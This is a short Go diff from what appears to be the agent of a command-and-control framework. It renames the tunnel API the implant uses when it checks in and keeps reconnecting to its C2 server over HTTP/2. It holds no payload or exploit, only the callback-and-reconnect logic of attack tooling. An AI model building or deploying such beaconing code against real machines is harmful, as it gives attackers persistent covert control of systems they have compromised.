@@ -42,9 +42,9 @@ connect:
 	}
 	log.Println("Checked in")
 
-	// connect to TunAPI, the JSON based h2 tunnel
-	tunURL := agent.CCAddress + tun.TunAPI
-	conn, ctx, cancel, err := agent.ConnectCC(tunURL)
+	// connect to MsgAPI, the JSON based h2 tunnel
+	msgURL := agent.CCAddress + tun.MsgAPI
+	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
 	agent.H2Json = conn
 	if err != nil {
 		log.Println("ConnectCC: ", err)
@@ -52,9 +52,9 @@ connect:
 		goto connect
 	}
 	log.Println("Connected to CC TunAPI")
-	err = agent.CCTun(ctx, cancel)
+	err = agent.CCMsgTun(ctx, cancel)
 	if err != nil {
-		log.Printf("CCTun: %v, reconnecting...", err)
+		log.Printf("CCMsgTun: %v, reconnecting...", err)
 	}
 	goto connect
 }
